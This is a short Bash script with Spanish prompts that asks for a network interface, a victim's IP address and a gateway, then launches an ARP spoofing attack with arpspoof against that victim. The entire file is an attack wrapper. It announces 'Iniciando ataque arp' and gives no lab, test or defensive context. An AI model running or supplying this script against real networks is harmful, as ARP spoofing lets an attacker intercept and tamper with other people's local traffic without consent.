# Pregunta por la interfaz de red.
# Pregunta por la IP de la máquina victima.
# Pregunta por el gateway.
echo -e "\e[32m Configurando ARP...\e[0m"
echo -e "\e[35m"
read -p "Introduzca la interfaz de red: " interfaz
echo -e "\e[0m"
echo -e "\e[35m"
read -p "Introduzca la IP de la máquina victima: " IP_Victima
echo -e "\e[0m"
echo -e "\e[35m"
read -p "Introduzca el gateway: " gateway
echo -e "\e[0m"

echo -e "\e[35m Iniciando ataque arp...\e[0m"
arpspoof -i $interfaz -t $IP_Victima $gateway
